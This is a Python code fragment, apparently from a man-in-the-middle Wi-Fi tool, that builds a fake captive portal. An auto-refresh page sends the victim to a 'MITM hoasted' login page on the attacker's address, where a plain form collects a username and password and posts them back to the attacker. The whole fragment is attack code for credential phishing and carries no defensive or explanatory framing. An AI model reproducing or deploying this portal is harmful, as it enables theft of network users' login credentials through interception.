    #this is the index of the captive portal
    #it simply redirects the user to the to login page
    html_redirect = """
    <html>
    <head>
        <meta http-equiv="refresh" content="0; url=http://{0}{1}{2}" />
    </head>
    <body>
        <b>Redirecting to MITM hoasted captive portal page</b>
    </body>
    </html>
    """.format(IP_ADDRESS, PORT, portalpage)
    html_login = """
    <!DOCTYPE html>
    <html>
    <head>
    <meta charset="utf-8" />
    <title></title>
    </head>
    <body>
    <form class="login" action="do_POST" method="post">
    <input type="text" name="username" value="username">
    <input type="text" name="password" value="password">
    <input type="submit" name="submit" value="submit">
    </form>
    </body>
    </html>
    """